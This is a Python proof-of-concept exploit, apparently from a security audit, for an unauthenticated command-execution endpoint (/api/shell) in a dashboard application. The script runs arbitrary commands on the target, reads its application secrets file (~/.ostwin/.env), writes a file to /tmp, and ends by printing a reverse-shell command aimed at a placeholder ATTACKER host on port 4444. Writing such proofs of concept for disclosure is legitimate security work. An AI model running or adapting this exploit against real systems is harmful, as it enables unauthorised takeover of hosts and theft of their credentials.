#!/usr/bin/env python3
"""
C1 — Unauthenticated RCE via POST /api/shell
Target: dashboard/routes/system.py:166-169

Exploit: POST /api/shell?command=<cmd> requires zero authentication.
         subprocess.run(command, shell=True) executes attacker input verbatim.

Usage:
    python3 poc.py [HOST] [PORT]
    python3 poc.py                     # defaults: localhost:9000
    python3 poc.py 192.168.1.10 9000
"""

import sys
import json
import urllib.request
import urllib.parse

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = sys.argv[2] if len(sys.argv) > 2 else "9000"
BASE = f"http://{HOST}:{PORT}"


def shell(cmd: str) -> dict:
    url = f"{BASE}/api/shell?command={urllib.parse.quote(cmd)}"
    req = urllib.request.Request(url, method="POST")
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read())


def run():
    print(f"[*] Target: {BASE}/api/shell")
    print(f"[*] No authentication headers sent.\n")

    # Stage 1: OS identity
    r = shell("id")
    assert r["returncode"] == 0, "Stage 1 failed"
    print(f"[+] Stage 1 — OS identity:\n    {r['stdout'].strip()}")

    # Stage 2: Hostname + working directory
    r = shell("hostname && pwd")
    print(f"[+] Stage 2 — Host / CWD:\n    {r['stdout'].strip()}")

    # Stage 3: Exfiltrate application secrets file
    r = shell("cat ~/.ostwin/.env 2>/dev/null || echo '(no .env found)'")
    print(f"[+] Stage 3 — Secret exfil (~/.ostwin/.env):\n    {r['stdout'].strip()}")

    # Stage 4: Prove arbitrary write (canary drop)
    canary = "/tmp/C1_RCE_CONFIRMED"
    r = shell(f"echo 'C1-pwned' > {canary} && cat {canary}")
    print(f"[+] Stage 4 — Arbitrary write + read ({canary}):\n    {r['stdout'].strip()}")

    print("\n[!] RCE confirmed. Host is fully compromised.")
    print(f"    Next step: reverse shell — curl -s {BASE}/api/shell?command=bash+-i+>&+/dev/tcp/ATTACKER/4444+0>&1")


if __name__ == "__main__":
    run()
